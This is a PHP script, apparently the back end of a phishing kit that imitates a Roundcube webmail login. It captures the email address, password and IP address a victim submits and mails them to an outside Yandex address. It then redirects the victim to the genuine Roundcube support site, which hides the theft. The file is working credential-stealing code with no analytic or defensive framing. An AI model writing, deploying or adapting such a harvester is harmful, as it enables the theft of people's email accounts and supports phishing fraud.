<?

$ip = getenv("REMOTE_ADDR");
$message .= "============ Roundcube Auto Result ============\n";
$message .= "Email ID: ".$_POST['email']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "============ Roundcube webmail =============\n";


$recipient = "j.lucasjames@yandex.com";
$subject = "Roundcube Result  .$ip.";
$headers = "logs";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "BUSINESS", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header
            ("Location: https://roundcube.net/support/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>


